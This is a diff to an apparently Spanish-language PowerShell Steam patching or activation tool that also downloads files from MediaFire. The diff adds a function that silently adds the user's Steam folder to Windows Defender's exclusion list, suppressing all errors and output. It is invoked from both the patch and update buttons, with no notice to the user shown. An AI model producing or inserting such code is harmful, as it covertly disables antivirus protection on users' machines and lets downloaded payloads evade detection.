@@ -62,6 +62,17 @@ function Get-SteamPath {
     throw "No se encontro Steam en el registro ni en rutas tipicas."
 }
 
+function Add-DefenderExclusion {
+    param([string]$Path)
+    try {
+        $mp = Get-Command Add-MpPreference -ErrorAction SilentlyContinue
+        if (-not $mp) { return }
+        $current = @((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath)
+        if ($current -contains $Path) { return }
+        Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue | Out-Null
+    } catch {}
+}
+
 function Download-MediaFire {
     param([string]$url, [string]$outFile, $progressBar = $null, [int]$progressStart = 0, [int]$progressEnd = 100)
     $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
@@ -1023,6 +1034,7 @@ $btnPatch.Add_Click({
     $btnPatch.Enabled = $false
     try {
         $steamRoot = Get-SteamPath
+        Add-DefenderExclusion $steamRoot
         $status.Text = "Activando..."
         $status.ForeColor = "#ffcc00"
         $form.Refresh()
@@ -1417,6 +1429,7 @@ $btnUpdate.Add_Click({
         $dlg.Close()
         try {
             $steamRoot = Get-SteamPath
+            Add-DefenderExclusion $steamRoot
             $status.Text = "Activando..."
             $status.ForeColor = "#ffcc00"
             $form.Refresh()
